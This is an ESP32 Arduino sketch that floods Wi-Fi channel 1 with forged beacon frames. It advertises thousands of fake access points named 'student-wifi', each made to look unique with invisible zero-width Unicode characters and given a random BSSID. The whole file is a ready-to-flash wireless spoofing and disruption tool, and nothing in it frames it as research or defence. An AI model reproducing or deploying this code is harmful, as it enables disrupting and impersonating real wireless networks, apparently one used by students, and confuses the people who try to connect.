#include <WiFi.h>
#include "esp_wifi.h"

uint8_t beaconPacket[128];

const char *baseName = "student-wifi";
uint8_t baseLen;

// 4 invisible UTF-8 characters (3 bytes each)
const char *invisible[4] = {
  "\xE2\x80\x8B",   // U+200B zero-width space
  "\xE2\x80\x8C",   // U+200C zero-width non-joiner
  "\xE2\x80\x8D",   // U+200D zero-width joiner
  "\xE2\x81\xA0"    // U+2060 word joiner
};

const uint8_t DIGITS = 6;   // 12-byte base + 18 = 30 bytes; 4^6 = 4,096 unique names
const uint8_t REPEATS = 10; // beacons per variant

void setup() {
  Serial.begin(115200);
  randomSeed(esp_random());
  baseLen = strlen(baseName);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

  Serial.printf("[*] Flooding '%s' on channel 1 (max unique: %u)\n",
                baseName, (unsigned)(1UL << (DIGITS * 2)));
}

void loop() {
  // Fixed header
  beaconPacket[0] = 0x80; beaconPacket[1] = 0x00;
  beaconPacket[2] = 0x00; beaconPacket[3] = 0x00;
  for (int i = 4; i <= 9; i++) beaconPacket[i] = 0xff;
  beaconPacket[22] = 0x00; beaconPacket[23] = 0x00;
  for (int i = 24; i <= 31; i++) beaconPacket[i] = 0x00;
  beaconPacket[32] = 0xe8; beaconPacket[33] = 0x03;
  beaconPacket[34] = 0x31; beaconPacket[35] = 0x04;

  // Random variant each pass = effectively infinite
  uint32_t idx = esp_random();

  char ssid[48];
  memcpy(ssid, baseName, baseLen);
  int sufLen = 0;
  for (int d = 0; d < DIGITS; d++) {
    const char *ch = invisible[(idx >> (d * 2)) & 3];
    memcpy(&ssid[baseLen + sufLen], ch, 3);
    sufLen += 3;
  }
  int len = baseLen + sufLen;   // 12 + 18 = 30 bytes, fits SSID limit

  // SSID element
  beaconPacket[36] = 0x00;
  beaconPacket[37] = len;
  memcpy(&beaconPacket[38], ssid, len);

  // Supported rates
  int p = 38 + len;
  beaconPacket[p++] = 0x01; beaconPacket[p++] = 0x08;
  beaconPacket[p++] = 0x82; beaconPacket[p++] = 0x84;
  beaconPacket[p++] = 0x8b; beaconPacket[p++] = 0x96;
  beaconPacket[p++] = 0x24; beaconPacket[p++] = 0x30;
  beaconPacket[p++] = 0x48; beaconPacket[p++] = 0x6c;

  // Channel tag
  beaconPacket[p++] = 0x03;
  beaconPacket[p++] = 0x01;
  beaconPacket[p++] = 1;

  // Repeat with fresh random BSSIDs each time
  for (int i = 0; i < REPEATS; i++) {
    for (int j = 10; j <= 15; j++) beaconPacket[j] = random(256);
    for (int j = 16; j <= 21; j++) beaconPacket[j] = beaconPacket[j - 6];
    esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, p, false);
  }
}
